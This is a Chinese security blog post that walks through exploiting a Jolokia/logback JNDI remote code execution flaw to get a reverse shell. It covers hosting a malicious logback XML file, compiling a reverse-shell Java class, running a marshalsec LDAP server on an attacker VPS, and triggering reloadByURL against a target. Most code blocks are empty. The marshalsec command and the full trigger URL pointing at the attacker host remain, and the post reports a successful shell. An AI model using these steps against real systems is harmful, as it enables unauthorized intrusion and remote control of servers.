#  Jolokia logback JNDI RCE漏洞复现   
原创 浩凯Security  浩凯信安   2024-12-06 00:31  
  
####   
#### 免责声明浩凯信安（本公众号）的技术文章仅供参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！  
####   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnKlXTfvQZOPCxib4VoHgCTyF5oATa7ZxbK9zYRia3x2ySqSicj0ic4oFHdlQ/640?wx_fmt=png&from=appmsg "")  
####   
#### 漏洞原理：  
  
  
1.直接访问可触发漏洞的URL，  
相当于通过jolokia调用ch.qos.logback.classic.jmx.JMXConfigurator  
类的reloadByURL  
方法  
  
2.目标机器请求外部日志配置文件地址，获得恶意xml文件  
  
3.目标机器使用saxParser.parse解析xml文件（这里导致了xxe漏洞）  
  
4.xml文件中利用logback  
依赖的insertFormJNDI标签，设置了外部JNDI服务器地址  
  
5.目标机器请求恶意JNDI服务器，导致JNDI注入，造成RCE漏洞  
  
#### 利用条件：  
  
- 目标网站存在  
/jolokia  
或  
/actuator/jolokia  
接口  
  
- 目标使用了  
jolokia-core  
依赖（版本要求未知）并且环境中存在相关MBean  
  
- 目标可以请求攻击者的HTTP服务器（请求可出外网）  
  
- 普通JNDI注入受目标JDK版本影响，jdk <  
6u201/7u191/8u182/11.0.1(LDAP)  
  
#### 利用方法：  
##### 步骤一：查看已存在的MBeans     
#####    
##### 访问/jolokia/list接口，查看是否存在ch.qos.logback.classic.jmx.JMXConfigurator和reloadByURL关键词。  
  
##### 步骤二：托管xml文件  
  
  
在自己控制的vps机器上开启一个简单HTTP服务器，端口尽量使用常见的HTTP服务端口（80、443）  
```
```  
  
在根目录下放置以  
xml  
结尾的  
example.xml  
文件，内容如下：  
```
```  
  
从ip为47.93.xx.xxx端口为1389获取名为JNDIObject的对象    
  
##### 步骤三：准备要执行的java代码  
  
  
用来反弹 shell 的   
JNDIObject.java  
```
```  
  
使用兼容低版本jdk的方式编译：  
```
```  
  
然后将生成的  
JNDIObject.class  
文件拷贝到步骤二中的网站根目录  
  
##### 步骤四：架设恶意ldap服务  
  
  
下载marshalsec，使用下面命令架设对应的ldap服务：  
```
```  
  
该命令使用 marshalsec 工具包中的 marshalsec.jndi.LDAPRefServer 类来创建一个 LDAP 服务器，该服务器将监听在本地的 1389 端口，并通过 HTTP 访问 URL  
http://47.93.45.xx:xxx/#JNDIObject  
，获取JNDIObject.class 文件  
  
##### 步骤五：监听反弹shell的端口  
  
  
一般使用nc监听端口，等待反弹shell  
```
```  
  
##### 步骤六：从外部URL地址加载日志配置文件  
  
> 如果目标成功请求  
exmple.xml  
并且marshalsec也接收到了目标请求，但是目标没有请求JNDIObject.class，大概率是因为目标环境的jdk版本太高，导致JNDI利用失败  
  
  
替换实际的your-vps-ip地址访问URL触发漏洞：  
```
```  
  
##### 漏洞复现案例  
  
  
存在reloadByURL，证明jolokia漏洞存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnKNhI01tC9iclnYdcvlhdZ5PkiaDglxqZiaYJj85ibrhRINMmbsd185YMiblw/640?wx_fmt=png&from=appmsg "")  
  
用python开启一个HTTP服务  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnKrqYoSr0Xk5TbUTj8tgEubiaK8gs25qqsyPpTd6xL4SloRkvDTichpVFg/640?wx_fmt=png&from=appmsg "")  
  
在根目录下放置以xml结尾的example.xml文件，内容如下：  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnKNoKGM7VPKPQzZlcic9OqYYtB9uC9XCstD8Px1UpGib3BBMPBrqLmhYxQ/640?wx_fmt=other&from=appmsg "")  
  
反弹shell，  
JNDIObject.java文件内容如下  
  
将下面的String ip和String port替换成自己vps-ip和端口  
```
```  
  
如上述不好使用下面的尝试  
```
```  
  
将上面的java文件进行编译，选择使用兼容低版本jdk的方式进行编译  
```
```  
  
然后将生成的  
JNDIObject.class  
文件与  
example.xml  
文件放在网站的根目录下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnKgEAOURTbLYdPiacMRW3yNLYutWsjEibUeMItldicsfmFopaP99dUU68fg/640?wx_fmt=png&from=appmsg "")  
  
使用  
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://47.93.xx.xxx:80/#JNDIObject 1389  
架设恶意ldap服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnKVlGsW6nT1iaLQsFWwBfys96G3msVJkoEPIDxicSB3GBxcwnF0txqC1vw/640?wx_fmt=png&from=appmsg "")  
  
监听反弹shell端口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnKsC62Q8xD2el1ZyulfZd1gbjiceNe2MHiaS2WUyniakD0gNRb5G1uLibGxQ/640?wx_fmt=png&from=appmsg "")  
  
从外部 URL 地址加载日志配置文件  
```
```  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnKKuzW400jiaICay8W0OBF7YGgEiavD3HGDHpVqkXQUF6FLlIia4ibGk1BPg/640?wx_fmt=png&from=appmsg "")  
  
这里我没有反弹shell成功，可能是因为我搭建的靶机java环境太高了  
  
MBeans：被管理的Java对象  
  
ldap 服务：目录管理工具  
  
 JNDI：是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互  
  
**这里我找到了JDK高版本注入的方式，我尝试使用ldap进行注入无法成功，但是rmi可以成功**  
  
用python开启一个HTTP服务  
```
```  
  
在根目录下放置以  
xml  
结尾的  
example.xml  
文件，内容如下：  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnKlVH1u3WohmicCiam7H5PQZ2Zup0RungSLpUkTMMN5N109Ix7YUkd7oCw/640?wx_fmt=png&from=appmsg "")  
```
```  
  
监听反弹shell端口4444  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnKhZN4ScNKaFU9icqBvIFsKnp21dETxwd5cjgt2eiaF9DUE47Ztq4RHalA/640?wx_fmt=png&from=appmsg "")  
  
启动命令  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnKqsJNdvcibpD6a6wMcG0wnaWXW6BQta0m3icvgb8YS71dnYcOVVbx8Qlg/640?wx_fmt=png&from=appmsg "")  
  
将这个替换到  
example.xml  
文件  
```
```  
  
然后通过URL访问  
> http://43.143.xxx.xx:9094/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/47.93.xx.xxx!/example.xml  
  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnK1gCCsiaNKo9OavQ7pribnOZ1uYJf3JiaOxtu48gt5icvWpicSQSXjicJvxfA/640?wx_fmt=other&from=appmsg "")  
  
发现反弹shell成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Kfq5WKPPMC8mSm15x2enS7MkIru9ZTnKjj9biaJxAJefr8icFpzQFicRt4KP9JwmH5m3K3iaWt0nYBlTVtNb7xz9xg/640?wx_fmt=other&from=appmsg "")  
  
  
